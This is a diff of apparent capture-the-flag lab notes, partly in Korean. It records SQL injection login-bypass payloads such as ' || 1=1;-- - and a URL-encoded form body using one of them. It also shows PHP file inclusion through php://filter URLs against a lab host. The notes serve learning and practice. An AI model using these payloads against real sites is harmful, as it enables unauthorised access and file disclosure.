@@ -189,8 +189,12 @@ password [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 348ms]
 
 # sql inject
 
+# || 는 되는데 OR 는 안 되네?
+
 ' || 1=1;-- -
-' OR 'x'='x'#;
+' || 1=1 #;
+
+' OR 1=1;-- -
 
 username=%27+%7C%7C+1%3D1%3B--+-&password=1
 
@@ -199,6 +203,8 @@ http://10.201.71.110/secret-script.php?file=supersecretadminpanel.html
 ![](https://velog.velcdn.com/images/agnusdei1207/post/0aea22c6-84fb-485f-a9e0-3aedd94d214f/image.png)
 
 # directory traversal -> php filter -> file inclusion vulnerability
+
+![](https://velog.velcdn.com/images/agnusdei1207/post/b635a7ef-f0a1-4fd3-9cab-2806015a9bf4/image.png)
 
 http://10.201.71.110/secret-script.php?file=php://filter/resource=supersecretmessageforadmin
 http://10.201.71.110/secret-script.php?file=php://filter/resource=users.html
